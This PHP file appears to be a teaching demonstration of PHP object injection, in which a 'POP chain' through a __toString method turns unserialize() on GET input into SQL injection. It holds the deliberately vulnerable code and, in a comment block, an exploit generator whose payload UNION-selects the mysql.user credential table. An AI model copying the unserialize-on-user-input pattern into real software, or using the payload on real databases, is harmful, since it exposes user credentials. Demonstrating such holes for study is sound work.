<?php
/**
 * This example shows how it is possible to perform a SQL Injection attack
 * using a "POP chain", for instance by leveraging a __toString method
 * based on Example 3 from https://www.owasp.org/index.php/PHP_Object_Injection
 */
require_once './config.php';
require_once './Database.php';

//*
class Foo {
	protected $obj;

	public function __toString() {
		if (isset($this->obj)) {
			return $this->obj->getValue();
		}
	}
}


class Stats {
	private $table;
	
	public function getValue($id) {
		$sql = "SELECT * FROM {$this->table} WHERE id = " . (int)$id;
		$result = mysql_query($sql, Database::getConnection());
		$row = mysql_fetch_assoc($result);
		
		return $row['User'];
	}
}
//*/

$userData = unserialize($_GET['data']);
echo $userData;

/* Exploit generation
class Stats {
	private $table = 'mysql.user WHERE 0 UNION SELECT * FROM mysql.user -- -';
}
class Foo {
	protected $obj;
	
	function __construct() {
		$this->obj = new Stats;
	}
}

echo urlencode(serialize(new Foo()));
//*/
?>